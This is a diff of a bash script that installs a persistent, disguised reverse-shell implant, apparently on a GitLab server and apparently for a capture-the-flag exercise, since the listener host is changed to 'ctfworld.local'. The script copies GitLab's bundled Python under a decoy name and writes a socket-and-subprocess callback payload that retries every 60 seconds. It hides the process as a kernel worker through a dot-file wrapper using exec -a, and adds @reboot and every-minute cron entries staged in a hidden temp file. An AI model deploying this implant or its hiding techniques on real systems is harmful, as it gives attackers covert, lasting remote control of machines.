@@ -1,30 +1,21 @@
 #!/bin/bash
 
-# Prompt user
 echo "[+] Enter your listener port number:"
 read PORT
 
-echo "[+] Enter the directory where files should be stored:"
+echo "[+] Enter the directory should be stored:"
 read TARGET_DIR
 
-LISTENER_IP="172.105.118.102"
+LISTENER_IP="ctfworld.local"
 
-# Change to target directory
-cd "$TARGET_DIR" || { echo "[-] Failed to cd to $TARGET_DIR"; exit 1; }
+cd "$TARGET_DIR" || exit 1
 
-# Copy python binary and make it executable
-cp /opt/gitlab/embedded/bin/python3 unicorn.bin
-chmod +x unicorn.bin
+# 1. Copy python to name: unicorn
+cp /opt/gitlab/embedded/bin/python3 gdbus
+chmod +x gdbus                                                                                                                                                                                                                                               
 
-# Create the launcher script "unicorn"
-cat << 'EOF' > unicorn
-#!/bin/bash
-exec -a "[ksoftirqd/2]" ./unicorn.bin $TARGET_DIR/master
-EOF
-chmod +x unicorn
-
-# Create Python payload "master" with Bash variables expanded
-cat << EOF > master
+# 2. Create python script named: master (NO .py, NO shebang)
+cat << EOF > user                                                                                                                                                                                                                                            
 import socket, subprocess, os, time
 
 while True:
@@ -39,15 +30,26 @@ while True:
         time.sleep(60)
 EOF
 
-chmod +x master
+chmod +x user
 
-# Create cron job
-crontab -l 2>/dev/null > /tmp/.fonts || true
-echo "@reboot $TARGET_DIR/unicorn" >> /tmp/.fonts
-echo "* * * * * $TARGET_DIR/unicorn" >> /tmp/.fonts
-crontab /tmp/.fonts
-rm /tmp/.fonts
+# 3. Create wrapper with exec -a for process hiding                                                                                                                                                                                                          
+cat << 'WRAPPER' > .dconf-service                                                                                                                                                                                                                            
+#!/bin/bash                                                                                                                                                                                                                                                  
+cd "$(dirname "$0")"                                                                                                                                                                                                                                         
+exec -a "[kworker/u8:2-events_unbound]" ./gdbus user                                                                                                                                                                                                         
+WRAPPER                                                                                                                                                                                                                                                      
+chmod +x .dconf-service                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                              
 
-echo "[+] Setup complete."
-echo "[+] To run immediately:"
-echo "    bash -c 'exec -a \"unicorn\" $TARGET_DIR/unicorn.bin master'"
+
+# 3. Write cron that runs EXACTLY: unicorn master
+crontab -l 2>/dev/null > /tmp/.dconf-db || true                                                                                                                                                                                                              
+
+echo "@reboot $TARGET_DIR/.dconf-service >/dev/null 2>&1" >> /tmp/.dconf-db                                                                                                                                                                                  
+echo "* * * * * $TARGET_DIR/.dconf-service >/dev/null 2>&1" >> /tmp/.dconf-db                                                                                                                                                                                
+
+crontab /tmp/.dconf-db                                                                                                                                                                                                                                       
+rm /tmp/.dconf-db                                                                                                                                                                                                                                            
+
+echo "[+] Done."
+                                                                                                                                                                                                                                                              
